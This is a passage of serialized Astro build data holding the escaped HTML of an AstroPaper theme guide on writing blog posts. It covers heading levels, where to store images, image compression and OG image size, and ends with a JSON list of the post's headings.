style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> some frontmatter\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">---\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">Here are some recommendations, tips &#x26; ticks for creating new posts in AstroPaper blog theme.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-weight:bold;--shiki-dark:#82B1FF;--shiki-dark-font-weight:inherit\">## Table of contents\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">&#x3C;!--\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> the rest of the post \u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">-->\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"headings\">Headings\u003C/h2>\n\u003Cp>There’s one thing to note about headings. The AstroPaper blog posts use title (title in the frontmatter) as the main heading of the post. Therefore, the rest of the heading in the post should be using h2 ~ h6.\u003C/p>\n\u003Cp>This rule is not mandatory, but highly recommended for visual, accessibility and SEO purposes.\u003C/p>\n\u003Ch2 id=\"storing-images-for-blog-content\">Storing Images for Blog Content\u003C/h2>\n\u003Cp>Here are two methods for storing images and displaying them inside a markdown file.\u003C/p>\n\u003Cblockquote>\n\u003Cp>Note! If it’s a requirement to style optimized images in markdown you should \u003Ca href=\"https://docs.astro.build/en/guides/images/#images-in-mdx-files\">use MDX\u003C/a>.\u003C/p>\n\u003C/blockquote>\n\u003Ch3 id=\"inside-srcassets-directory-recommended\">Inside \u003Ccode>src/assets/\u003C/code> directory (recommended)\u003C/h3>\n\u003Cp>You can store images inside \u003Ccode>src/assets/\u003C/code> directory. These images will be automatically optimized by Astro through \u003Ca href=\"https://docs.astro.build/en/reference/image-service-reference/\">Image Service API\u003C/a>.\u003C/p>\n\u003Cp>You can use relative path or alias path (\u003Ccode>@assets/\u003C/code>) to serve these images.\u003C/p>\n\u003Cp>Example: Suppose you want to display \u003Ccode>example.jpg\u003C/code> whose path is \u003Ccode>/src/assets/images/example.jpg\u003C/code>.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"md\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">![\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">something\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">]\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#7FDBCA\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#FF869A\">@assets/images/example.jpg\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#7FDBCA\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">&#x3C;!--\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> OR \u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">-->\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">![\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">something\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">]\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#7FDBCA\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#FF869A\">../../assets/images/example.jpg\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#7FDBCA\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">&#x3C;!--\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Using img tag or Image component won't work ❌ \u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">-->\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">&#x3C;img src=\"@assets/images/example.jpg\" alt=\"something\">\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">&#x3C;!--\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> ^^ This is wrong \u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">-->\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cblockquote>\n\u003Cp>Technically, you can store images inside any directory under \u003Ccode>src\u003C/code>. In here, \u003Ccode>src/assets\u003C/code> is just a recommendation.\u003C/p>\n\u003C/blockquote>\n\u003Ch3 id=\"inside-public-directory\">Inside \u003Ccode>public\u003C/code> directory\u003C/h3>\n\u003Cp>You can store images inside the \u003Ccode>public\u003C/code> directory. Keep in mind that images stored in the \u003Ccode>public\u003C/code> directory remain untouched by Astro, meaning they will be unoptimized and you need to handle image optimization by yourself.\u003C/p>\n\u003Cp>For these images, you should use an absolute path; and these images can be displayed using \u003Ca href=\"https://www.markdownguide.org/basic-syntax/#images-1\">markdown annotation\u003C/a> or \u003Ca href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img\">HTML img tag\u003C/a>.\u003C/p>\n\u003Cp>Example: Assume \u003Ccode>example.jpg\u003C/code> is located at \u003Ccode>/public/assets/images/example.jpg\u003C/code>.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"md\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">![\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#D6DEEB\">something\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">]\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#7FDBCA\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#FF869A\">/assets/images/example.jpg\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#7FDBCA\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">&#x3C;!--\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> OR \u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">-->\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">&#x3C;img src=\"/assets/images/example.jpg\" alt=\"something\">\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"bonus\">Bonus\u003C/h2>\n\u003Ch3 id=\"image-compression\">Image compression\u003C/h3>\n\u003Cp>When you put images in the blog post (especially for images under \u003Ccode>public\u003C/code> directory), it is recommended that the image is compressed. This will affect the overall performance of the website.\u003C/p>\n\u003Cp>My recommendation for image compression sites.\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ca href=\"https://tinypng.com/\">TinyPng\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://tinyjpg.com/\">TinyJPG\u003C/a>\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"og-image\">OG Image\u003C/h3>\n\u003Cp>The default OG image will be placed if a post does not specify the OG image. Though not required, OG image related to the post should be specify in the frontmatter. The recommended size for OG image is \u003Cstrong>\u003Cem>1200 X 640\u003C/em>\u003C/strong> px.\u003C/p>\n\u003Cblockquote>\n\u003Cp>Since AstroPaper v1.4.0, OG images will be generated automatically if not specified. Check out \u003Ca href=\"https://astro-paper.pages.dev/posts/dynamic-og-image-generation-in-astropaper-blog-posts/\">the announcement\u003C/a>.\u003C/p>\n\u003C/blockquote>",{"headings":277,"imagePaths":311,"frontmatter":263},[278,281,284,287,290,293,296,299,302,305,308],{"depth":30,"slug":279,"text":280},"table-of-contents","Table of contents",{"depth":30,"slug":282,"text":283},"frontmatter","Frontmatter",{"depth":65,"slug":285,"text":286},"sample-frontmatter","Sample Frontmatter",{"depth":30,"slug":288,"text":289},"adding-table-of-contents","Adding table of contents",{"depth":30,"slug":291,"text":292},"headings","Headings",{"depth":30,"slug":294,"text":295},"storing-images-for-blog-content","Storing Images for Blog Content",{"depth":65,"slug":297,"text":298},"inside-srcassets-directory-recommended","Inside src/assets/ directory (recommended)",{"depth":65,"slug":300,"text":301},"inside-public-directory","Inside public directory",{"depth":30,"slug":303,"text":304},"bonus","Bonus",{"depth":65,"slug":306,"text":307},"image-compression","Image compression",{"depth":65,"slug":309,"text":310},"og-image","OG Image",[]]